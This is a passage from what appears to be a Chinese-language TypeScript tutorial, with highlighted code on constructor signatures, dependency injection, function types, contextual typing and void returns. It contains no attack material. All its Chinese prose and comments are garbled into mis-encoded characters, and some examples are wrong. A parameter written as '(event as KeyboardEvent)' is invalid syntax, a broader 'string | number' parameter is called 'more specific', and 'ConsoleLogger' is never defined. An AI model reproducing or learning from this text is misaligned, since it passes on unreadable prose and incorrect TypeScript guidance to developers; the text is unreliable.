class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ„é€ å‡½æ•°ç±»å‹å®šä¹‰</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">StringInitializable</span> = &#123;<br>  <span class="hljs-title function_">new</span> (<span class="hljs-attr">s</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">object</span>;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">StringWrapper</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> <span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span></span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">wrapString</span>(<span class="hljs-params"><span class="hljs-attr">ctor</span>: <span class="hljs-title class_">StringInitializable</span>, <span class="hljs-attr">s</span>: <span class="hljs-built_in">string</span></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">ctor</span>(s);<br>&#125;<br><br><span class="hljs-keyword">const</span> wrapped = <span class="hljs-title function_">wrapString</span>(<span class="hljs-title class_">StringWrapper</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>((wrapped <span class="hljs-keyword">as</span> <span class="hljs-title class_">StringWrapper</span>).<span class="hljs-property">value</span>); <span class="hljs-comment">// &quot;test&quot;</span><br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹å®è·µè¦ç‚¹</strong></p><ol><li>é¿å…è¿‡åº¦ä½¿ç”¨é™æ€æˆå‘˜ï¼šé™æ€æˆå‘˜æœ¬è´¨æ˜¯å…¨å±€çŠ¶æ€ï¼Œä¸åˆ©äºæµ‹è¯•å’Œæ‰©å±•</li><li>æ„é€ ç­¾åç”¨äºä¾èµ–æ³¨å…¥ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä¾èµ–æ³¨å…¥å®¹å™¨</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Container</span> &#123;<br>  <span class="hljs-keyword">private</span> instances = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br>  <br>  register&lt;T&gt;(<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">ctor</span>: <span class="hljs-title function_">new</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; T) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">instances</span>.<span class="hljs-title function_">set</span>(key, <span class="hljs-keyword">new</span> <span class="hljs-title function_">ctor</span>());<br>  &#125;<br>  <br>  resolve&lt;T&gt;(<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>): T &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">instances</span>.<span class="hljs-title function_">get</span>(key);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> container = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Container</span>();<br>container.<span class="hljs-title function_">register</span>(<span class="hljs-string">&quot;logger&quot;</span>, <span class="hljs-title class_">ConsoleLogger</span>);<br><span class="hljs-keyword">const</span> logger = container.<span class="hljs-property">resolve</span>&lt;<span class="hljs-title class_">ConsoleLogger</span>&gt;(<span class="hljs-string">&quot;logger&quot;</span>);<br></code></pre></td></tr></table></figure><ol start="3"><li>é™æ€æˆå‘˜ç±»å‹å®‰å…¨ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Validator</span> &#123;<br>  <span class="hljs-keyword">static</span> patterns = &#123;<br>    <span class="hljs-attr">email</span>: <span class="hljs-regexp">/^[^\s@]+@[^\s@]+\.[^\s@]+$/</span>,<br>    <span class="hljs-attr">phone</span>: <span class="hljs-regexp">/^\d&#123;10&#125;$/</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params"><span class="hljs-attr">type</span>: keyof <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Validator</span>.patterns, <span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">patterns</span>[<span class="hljs-keyword">type</span>].<span class="hljs-title function_">test</span>(value);<br>  &#125;<br>&#125;<br><br><span class="hljs-title class_">Validator</span>.<span class="hljs-title function_">validate</span>(<span class="hljs-string">&quot;email&quot;</span>, <span class="hljs-string">&quot;test@example.com&quot;</span>); <span class="hljs-comment">// âœ…</span><br><span class="hljs-title class_">Validator</span>.<span class="hljs-title function_">validate</span>(<span class="hljs-string">&quot;postal&quot;</span>, <span class="hljs-string">&quot;12345&quot;</span>); <span class="hljs-comment">// ğŸš« é”™è¯¯ï¼æ— æ­¤ç±»å‹</span><br></code></pre></td></tr></table></figure><ol start="4"><li>æ„é€ ç­¾åçº¦æŸï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è¦æ±‚æ„é€ å‡½æ•°å…·æœ‰ç‰¹å®šé™æ€å±æ€§</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">PluginCtor</span> &#123;<br>  <span class="hljs-title function_">new</span> (): <span class="hljs-title class_">Plugin</span>;<br>  <span class="hljs-attr">version</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">dependencies</span>?: <span class="hljs-built_in">string</span>[];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">loadPlugin</span>(<span class="hljs-params"><span class="hljs-attr">ctor</span>: <span class="hljs-title class_">PluginCtor</span></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Loading <span class="hljs-subst">$&#123;ctor.name&#125;</span> v<span class="hljs-subst">$&#123;ctor.version&#125;</span>`</span>);<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-3-å‡½æ•°ä¸æ³›å‹ç¼–ç¨‹"><a href="#1-3-å‡½æ•°ä¸æ³›å‹ç¼–ç¨‹" class="headerlink" title="1.3 å‡½æ•°ä¸æ³›å‹ç¼–ç¨‹"></a>1.3 å‡½æ•°ä¸æ³›å‹ç¼–ç¨‹</h2><h3 id="1-3-1-å‡½æ•°ç±»å‹å®šä¹‰ä¸ä¸Šä¸‹æ–‡æ¨æ–­"><a href="#1-3-1-å‡½æ•°ç±»å‹å®šä¹‰ä¸ä¸Šä¸‹æ–‡æ¨æ–­" class="headerlink" title="1.3.1 å‡½æ•°ç±»å‹å®šä¹‰ä¸ä¸Šä¸‹æ–‡æ¨æ–­"></a>1.3.1 å‡½æ•°ç±»å‹å®šä¹‰ä¸ä¸Šä¸‹æ–‡æ¨æ–­</h3><p><strong>å‡½æ•°ç±»å‹å®šä¹‰æ–¹å¼</strong></p><ol><li>å‡½æ•°å£°æ˜å¼</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å®Œæ•´ç±»å‹æ³¨è§£</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> &#123;<br>  <span class="hljs-keyword">return</span> x + y;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>å‡½æ•°è¡¨è¾¾å¼</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å˜é‡ç±»å‹æ³¨è§£</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">multiply</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">x, y</span>) &#123;<br>  <span class="hljs-keyword">return</span> x * y;<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="3"><li>ç®­å¤´å‡½æ•°</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç±»å‹æ³¨è§£åœ¨å˜é‡ä¸Š</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">divide</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">dividend</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">divisor</span>: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span> = <br>  <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a / b;<br></code></pre></td></tr></table></figure><ol start="4"><li>å¯¹è±¡æ–¹æ³•</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> calculator = &#123;<br>  <span class="hljs-attr">sum</span>: (<span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> x + y,<br>  <span class="hljs-title function_">subtract</span>(<span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">number</span> &#123;<br>    <span class="hljs-keyword">return</span> x - y;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>å‡½æ•°ç±»å‹ç­¾åè¯¦è§£</strong></p><p>åŸºæœ¬ç»“æ„ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">AddFunction</span> = <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span>;<br></code></pre></td></tr></table></figure><p>å¯é€‰å‚æ•°ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">GreetFunction</span> = <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">prefix</span>?: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">string</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">greet</span>: <span class="hljs-title class_">GreetFunction</span> = <span class="hljs-function">(<span class="hljs-params">n, p</span>) =&gt;</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;p || <span class="hljs-string">&quot;Hello&quot;</span>&#125;</span> <span class="hljs-subst">$&#123;n&#125;</span>`</span>;<br><span class="hljs-title function_">greet</span>(<span class="hljs-string">&quot;Alice&quot;</span>); <span class="hljs-comment">// âœ… å…è®¸çœç•¥å¯é€‰å‚æ•°</span><br></code></pre></td></tr></table></figure><p>é»˜è®¤å‚æ•°ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">CreateUser</span> = <span class="hljs-function">(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-attr">role</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">&quot;user&quot;</span> <span class="hljs-comment">// é»˜è®¤å€¼</span></span></span><br><span class="hljs-params"><span class="hljs-function"></span>) =&gt;</span> <span class="hljs-built_in">void</span>;<br></code></pre></td></tr></table></figure><p>å‰©ä½™å‚æ•°ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">SumFunction</span> = <span class="hljs-function">(<span class="hljs-params">...<span class="hljs-attr">numbers</span>: <span class="hljs-built_in">number</span>[]</span>) =&gt;</span> <span class="hljs-built_in">number</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">sum</span>: <span class="hljs-title class_">SumFunction</span> = <span class="hljs-function">(<span class="hljs-params">...nums</span>) =&gt;</span> nums.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>);<br><span class="hljs-title function_">sum</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>); <span class="hljs-comment">// 6</span><br></code></pre></td></tr></table></figure><p><strong>ä¸Šä¸‹æ–‡ç±»å‹æ¨æ–­ï¼ˆContextual Typingï¼‰</strong></p><p>æ ¸å¿ƒåŸç†ï¼šTypeScript æ ¹æ®å‡½æ•°è¢«ä½¿ç”¨çš„ä½ç½®è‡ªåŠ¨æ¨æ–­å‚æ•°ç±»å‹</p><p>å…¸å‹åœºæ™¯ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åœºæ™¯1ï¼šå›è°ƒå‡½æ•°å‚æ•°æ¨æ–­</span><br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num * <span class="hljs-number">2</span>); <span class="hljs-comment">// num æ¨æ–­ä¸º number</span><br><br><span class="hljs-comment">// åœºæ™¯2ï¼šäº‹ä»¶å¤„ç†å‡½æ•°</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">clientX</span>); <span class="hljs-comment">// event æ¨æ–­ä¸º MouseEvent</span><br>&#125;);<br><br><span class="hljs-comment">// åœºæ™¯3ï¼šå‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">runCallback</span>(<span class="hljs-params"><span class="hljs-attr">cb</span>: (value: <span class="hljs-built_in">string</span>) =&gt; <span class="hljs-built_in">void</span></span>) &#123;<br>  <span class="hljs-title function_">cb</span>(<span class="hljs-string">&quot;test&quot;</span>);<br>&#125;<br><br><span class="hljs-title function_">runCallback</span>(<span class="hljs-function"><span class="hljs-params">str</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">toUpperCase</span>()); <span class="hljs-comment">// str æ¨æ–­ä¸º string</span><br>&#125;);<br></code></pre></td></tr></table></figure><p>æ˜¾å¼è¦†ç›–ä¸Šä¸‹æ–‡ç±»å‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨ç±»å‹æ–­è¨€è¦†ç›–æ¨æ–­</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;keydown&quot;</span>, <span class="hljs-function">(<span class="hljs-params">event <span class="hljs-keyword">as</span> <span class="hljs-title class_">KeyboardEvent</span></span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">key</span>); <span class="hljs-comment">// å¼ºåˆ¶æŒ‡å®šä¸º KeyboardEvent</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>å‡½æ•°ç±»å‹å…¼å®¹æ€§</strong></p><p>å‚æ•°å…¼å®¹è§„åˆ™ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Handler</span> = <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;<br><br><span class="hljs-comment">// âœ… å…¼å®¹ï¼šå‚æ•°ç±»å‹æ›´å…·ä½“</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">h1</span>: <span class="hljs-title class_">Handler</span> = <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>) =&gt;</span> &#123;&#125;;<br><span class="hljs-comment">// âœ… å…¼å®¹ï¼šå‚æ•°æ•°é‡æ›´å°‘</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">h2</span>: <span class="hljs-title class_">Handler</span> = <span class="hljs-function">() =&gt;</span> &#123;&#125;;<br><span class="hljs-comment">// ğŸš« ä¸å…¼å®¹ï¼šå‚æ•°ç±»å‹å†²çª</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">h3</span>: <span class="hljs-title class_">Handler</span> = <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">number</span></span>) =&gt;</span> &#123;&#125;; <span class="hljs-comment">// é”™è¯¯ï¼</span><br><br><span class="hljs-comment">// è¿”å›å€¼å…¼å®¹è§„åˆ™</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Factory</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">string</span>;<br><span class="hljs-comment">// âœ… å…¼å®¹ï¼šè¿”å›å€¼æ›´å…·ä½“</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">f1</span>: <span class="hljs-title class_">Factory</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-comment">// ğŸš« ä¸å…¼å®¹ï¼šè¿”å›å€¼ç±»å‹å†²çª</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">f2</span>: <span class="hljs-title class_">Factory</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-number">123</span>; <span class="hljs-comment">// é”™è¯¯ï¼</span><br></code></pre></td></tr></table></figure><p>å¯¹è±¡æ–¹æ³•å…¼å®¹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Component</span> &#123;<br>  <span class="hljs-attr">onEvent</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-comment">// âœ… å…¼å®¹ï¼šå‚æ•°æ•°é‡æ›´å°‘</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">comp</span>: <span class="hljs-title class_">Component</span> = &#123;<br>  <span class="hljs-attr">onEvent</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Event fired&quot;</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>void è¿”å›ç±»å‹çš„ç‰¹æ®Šè¡Œä¸º</strong></p><p>å…³é”®ç‰¹æ€§ï¼šå…è®¸è¿”å›ä»»æ„å€¼ï¼ˆä½†è¿”å›å€¼ä¼šè¢«å¿½ç•¥ï¼‰</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">VoidFunc</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;<br><br><span class="hljs-comment">// åˆæ³•å®ç°ï¼ˆè™½ç„¶è¿”å›äº†å€¼ï¼‰</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">fn</span>: <span class="hljs-title class_">VoidFunc</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨åœºæ™¯</span><br><span class="hljs-keyword">const</span> strings = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>];<br><span class="hljs-keyword">const</span> <span class="hljs-attr">results</span>: <span class="hljs-built_in">void</span>[] = strings.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">s</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s)); <span class="hljs-comment">// å…è®¸è¿”å›void</span><br></code></pre></td></tr></table></figure><p>ä¸undefinedçš„åŒºåˆ«ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å¿…é¡»æ˜¾å¼è¿”å›undefined</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">StrictVoid</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-literal">undefined</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-attr">strictFn</span>: <span class="hljs-title class_">StrictVoid</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// âœ…</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">invalidFn</span>: <span class="hljs-title class_">StrictVoid</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-string">&quot;test&quot;</span>;   <span class="hljs-comment">// ğŸš« é”™è¯¯</span><br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹å®è·µè¦ç‚¹</strong></p><ol><li>ä¼˜å…ˆä½¿ç”¨ä¸Šä¸‹æ–‡æ¨æ–­ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ¨èï¼šè®©TSè‡ªåŠ¨æ¨æ–­</span><br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num * <span class="hljs-number">2</span>);<br><br><span class="hljs-comment">// ä¸æ¨èï¼šå†—ä½™æ³¨è§£</span><br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>].<span class="hljs-title function_">map</span>((<span class="hljs-attr">num</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> num * <span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><ol start="2"><li>å›è°ƒå‡½æ•°å‚æ•°å‘½åçº¦å®šï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨æè¿°æ€§å‚æ•°åå¢å¼ºå¯è¯»æ€§</span><br><span class="hljs-title function_">fetchUser</span>(<span class="hljs-function"><span class="hljs-params">userId</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(userId); <span class="hljs-comment">// æ¯” `id` æ›´æ˜ç¡®</span><br>&#125;);<br></code></pre></td></tr></table></figure><ol start="3"><li>é¿å…anyæ±¡æŸ“å‡½æ•°é“¾ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å±é™©ï¼šanyç±»å‹ä¼ æ’­</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">dangerous</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">number</span> = <span class="hljs-function"><span class="hljs-params">input</span> =&gt;</span> input.<span class="hljs-property">length</span>;<br><br><span class="hljs-comment">// å®‰å…¨ï¼šæ˜ç¡®ç±»å‹çº¦æŸ</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">safe</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">any</span>[]</span>) =&gt;</span> <span class="hljs-built_in">number</span> = <span class="hljs-function"><span class="hljs-params">input</span> =&gt;</span> input.<span class="hljs-property">length</span>;<br></code></pre></td></tr></table></figure><ol start="4"><li>å‡½æ•°é‡è½½ä¼˜å…ˆäºè”åˆå‚æ•°ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä¸æ¨èï¼šè”åˆç±»å‹å‚æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">padLeft</span>(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">padding</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">string</span> &#123;<br>  <span class="hljs-comment">/*...*/</span><br>&#125;<br><br><span class="hljs-comment">// æ¨èï¼šå‡½æ•°é‡è½½ï¼ˆä¸‹ä¸€èŠ‚å†…å®¹ï¼‰</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">padLeft</span>(<span class="hljs-params"><span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">padding</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span>;<br><span class="hljs-keyword">function</span> 